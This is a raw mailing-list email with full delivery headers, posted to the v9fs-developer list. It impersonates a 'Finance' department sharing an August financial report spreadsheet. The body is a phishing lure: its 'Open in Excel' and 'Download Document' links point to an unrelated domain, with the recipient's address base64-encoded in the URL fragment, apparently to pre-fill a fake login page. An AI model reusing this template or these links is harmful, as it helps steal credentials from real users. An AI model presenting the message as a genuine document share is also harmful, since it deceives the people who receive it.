Return-Path: <v9fs-developer-bounces@lists.sourceforge.net>
X-Original-To: lists+v9fs-developer@lfdr.de
Delivered-To: lists+v9fs-developer@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 4D5E094C26C
	for <lists+v9fs-developer@lfdr.de>; Thu,  8 Aug 2024 18:17:15 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <v9fs-developer-bounces@lists.sourceforge.net>)
	id 1sc5pB-0007uH-Ok;
	Thu, 08 Aug 2024 16:17:13 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <president@flexittank.net>) id 1sc5pA-0007uB-SD
 for v9fs-developer@lists.sourceforge.net;
 Thu, 08 Aug 2024 16:17:12 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Message-Id:Date:MIME-Version:Content-Type:To:
 Subject:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=0LqcLTjtDrvdiY0ngmTsW9mAidOQWnVtzdZXhGzZymc=; b=ilkpcF4srvyumBiByRO9rh92lX
 xyfL3acrSLeQiDhuJ4F69PYDhomnLFkB6TxtyvlLmUZbePygHtRLuUvNvYppj7g97dZkPcM0IlWgJ
 0HfmQkvkbeRQeZ+zN/DZmaCH5RXdSvQciKbC8owFsFdF6dbpYz6AY6ZbUGerlsjA+9EQ=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Message-Id:Date:MIME-Version:Content-Type:To:Subject:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=0LqcLTjtDrvdiY0ngmTsW9mAidOQWnVtzdZXhGzZymc=; b=F
 UQIEdh1uJC+WCf180oTFYeIrbuRczPn0wOqxBjpON8uDfmRnPtZILOEOGt7QaWkND+2tscKM+UwKZ
 fpMEFAV6BNEqG+lswVw+qaOsGHJCylNVazqg06tU81I03Q+wczjs6et3ZVggEMquiGBW+W44hjzVJ
 9yWzWoqOXAc3aqyc=;
Received: from flexittank.net ([45.145.42.85])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES128-GCM-SHA256:128) (Exim 4.95)
 id 1sc5p9-0005x5-AB for v9fs-developer@lists.sourceforge.net;
 Thu, 08 Aug 2024 16:17:12 +0000
Received: from EC2AMAZ-HFMJDML (ec2-35-171-19-68.compute-1.amazonaws.com
 [35.171.19.68])
 by flexittank.net (Postfix) with ESMTPSA id B2C54AF8AD
 for <v9fs-developer@lists.sourceforge.net>;
 Thu,  8 Aug 2024 18:16:59 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=flexittank.net;
 s=default; t=1723133820;
 bh=0LqcLTjtDrvdiY0ngmTsW9mAidOQWnVtzdZXhGzZymc=; h=From:Subject:To;
 b=f6CacCHIcDbftv+z+QB4a/e74JbXjIqqWLxQbGqvqub+ElvbJPfYaprbeCdFlniEn
 kT+8UC9g4un7rhH90XpU3h5w/8azaRCT5XB9xwQUIA5J8pY0hpEgnNqrRn3P7rkbpf
 l2tVUBiThluaTkKPvqKXZiSl8mF+xL6rI/1z9ZobDgbbVu+tXgfAWKT/uOnaRZv8T3
 hPoy2/RKogaO4IGAnKzrGy6YW0k+kro0i6TDOJYuvMbk2VA4ixiWkLYuaN/2ge89dh
 JUS8zg+K2OuUsjYI4MiN9k8L5ZDDhlRJduCB0d5XOivIB7Ime5whp3DlDw3mP6wqUN
 HX86cNIWnMCeQ==
Authentication-Results: flexittank.net;
 spf=pass (sender IP is 35.171.19.68) smtp.mailfrom=president@flexittank.net
 smtp.helo=EC2AMAZ-HFMJDML
Received-SPF: pass (flexittank.net: connection is authenticated)
To: <v9fs-developer@lists.sourceforge.net>
MIME-Version: 1.0
Date: Thu, 8 Aug 2024 16:16:59 +0000
Message-Id: <08592024081616D90E6EB342$394FAC6B43@flexittank.net>
X-Spam-Score: -0.2 (/)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Lists Accounts and Finance has shared access to "August
 Financial
 Meeting Report 2024.xlsx" With You v9fs-developer@lists.sourceforge.net .
 Content analysis details:   (-0.2 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: flexittank.net]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 -0.0 SPF_HELO_PASS          SPF: HELO matches SPF record
 0.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 0.0 T_KAM_HTML_FONT_INVALID Test for Invalidly Named or Formatted
 Colors in HTML
X-Headers-End: 1sc5p9-0005x5-AB
X-Content-Filtered-By: Mailman/MimeDel 2.1.21
Subject: [V9fs-developer] Your Lists August Finance Reconciliation Report
X-BeenThere: v9fs-developer@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: "deprecated: use v9fs@lists.linux.dev"
 <v9fs-developer.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/v9fs-developer>, 
 <mailto:v9fs-developer-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=v9fs-developer>
List-Post: <mailto:v9fs-developer@lists.sourceforge.net>
List-Help: <mailto:v9fs-developer-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/v9fs-developer>, 
 <mailto:v9fs-developer-request@lists.sourceforge.net?subject=subscribe>
From: Finance via V9fs-developer <v9fs-developer@lists.sourceforge.net>
Reply-To: Finance <president@flexittank.net>
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Errors-To: v9fs-developer-bounces@lists.sourceforge.net


Lists Accounts and Finance has shared access to "August Financial Meeting Report 2024.xlsx" With You

v9fs-developer@lists.sourceforge.net

.

Lists _payment Schedule August 2024.xlsx

Last modified Thursday, August 8, 2024 

Open in Excel https://khobregankghaz.com/#djlmcy1kZXZlbG9wZXJAbGlzdHMuc291cmNlZm9yZ2UubmV0

Download Document https://khobregankghaz.com/#djlmcy1kZXZlbG9wZXJAbGlzdHMuc291cmNlZm9yZ2UubmV0

_______________________________________________
V9fs-developer mailing list
V9fs-developer@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/v9fs-developer
